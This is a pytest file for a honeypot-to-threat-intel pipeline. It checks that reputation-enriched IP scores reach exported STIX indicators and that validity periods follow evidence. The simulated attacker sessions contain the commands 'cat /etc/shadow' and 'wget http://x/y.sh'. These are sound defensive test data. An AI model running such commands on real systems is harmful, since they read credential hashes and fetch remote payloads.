"""The pipeline's own best analysis must reach the layer consumers see.

`build_ip_observable` scored an attacker with `_ip_score` (substance PLUS
threat-intel reputation). `build_ip_indicator` used bare `_signal_score`, so
every enrichment was recomputed away at the export layer.

Measured live 2026-08-05: of 500 IPv4 observables the pipeline scored >=90,
346 (69%) exported as revoked score-20 indicators. 10,195 observables scored
>=70; only 80 indicators did.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from tpot2cti.parsers.base import AttackSession, ParsedEvent
from tpot2cti.stix.builder import (
    BASELINE_INDICATOR_SCORE, _ip_score, _signal_score, _validity_days_for,
)

NOW = datetime(2026, 8, 5, 12, 0, tzinfo=timezone.utc)


def _session(*, rep=None, commands=(), malware=(), auth=False):
    s = AttackSession(src_ip="203.0.113.55", session_id="s1",
                      sensor_hostname="sensor01", event_type="Cowrie",
                      first_seen=NOW, last_seen=NOW)
    s.auth_success = auth
    s.commands.extend(commands)
    s.malware_hashes.extend(malware)
    if rep is not None:
        ev = ParsedEvent(src_ip=s.src_ip, timestamp=NOW,
                         sensor_hostname="sensor01", event_type="Cowrie",
                         raw_doc={"ip_rep": rep})
        s.events.append(ev)
    return s


def test_reputation_reaches_the_indicator(builder):
    """The load-bearing case. A known-bad IP earns +25 on the observable;
    that must not vanish on the indicator."""
    # Reputation is the ONLY differentiator here — add commands/auth and both
    # scores saturate at 100 and the gap disappears from the fixture.
    s = _session(rep="known attacker")
    assert _signal_score(s) == BASELINE_INDICATOR_SCORE
    assert _ip_score(s) == BASELINE_INDICATOR_SCORE + 25, (
        "fixture no longer exercises the gap"
    )

    ind = builder.build_ip_indicator(s.src_ip, session=s)
    assert ind["x_opencti_score"] == _ip_score(s), (
        "the indicator is still being scored with bare _signal_score — the "
        "reputation enrichment is discarded at the export layer"
    )


def test_a_high_evidence_ip_does_not_export_at_baseline(builder):
    """69% of score->=90 observables exported as score-20 indicators."""
    s = _session(rep="known attacker", auth=True,
                 commands=["cat /etc/shadow"], malware=["a" * 64])
    ind = builder.build_ip_indicator(s.src_ip, session=s)
    assert ind["x_opencti_score"] >= 80, (
        f"high-evidence IP exported at {ind['x_opencti_score']}"
    )


def test_a_bare_probe_still_exports_at_baseline(builder):
    """Positive control — propagation must not inflate everything."""
    ind = builder.build_ip_indicator("203.0.113.99", session=_session())
    assert ind["x_opencti_score"] == BASELINE_INDICATOR_SCORE


# ── validity follows evidence, not age ───────────────────────────────────

@pytest.mark.parametrize("score,expected", [
    (100, 90), (90, 90), (80, 90),
    (75, 45), (70, 45),
    (60, 21), (51, 21),
    (50, 7), (20, 7),
])
def test_validity_is_banded_by_evidence(score, expected):
    assert _validity_days_for(score) == expected


def test_validity_is_monotone_in_score():
    """More evidence must never mean a shorter life."""
    days = [_validity_days_for(s) for s in range(0, 101, 5)]
    assert days == sorted(days), f"non-monotone validity: {days}"


def test_a_substantive_ip_outlives_a_drive_by(builder):
    """End-to-end: the whole point is that persistent attackers stop being
    revoked before the drive-bys they outlast."""
    strong = builder.build_ip_indicator(
        "203.0.113.55",
        session=_session(rep="known attacker", auth=True,
                         commands=["wget http://x/y.sh"], malware=["b" * 64]))
    weak = builder.build_ip_indicator("203.0.113.77", session=_session())

    def until(o):
        return datetime.fromisoformat(o["valid_until"])
    assert until(strong) - until(weak) >= timedelta(days=60), (
        "a malware-dropping known-bad IP expires alongside a bare probe"
    )
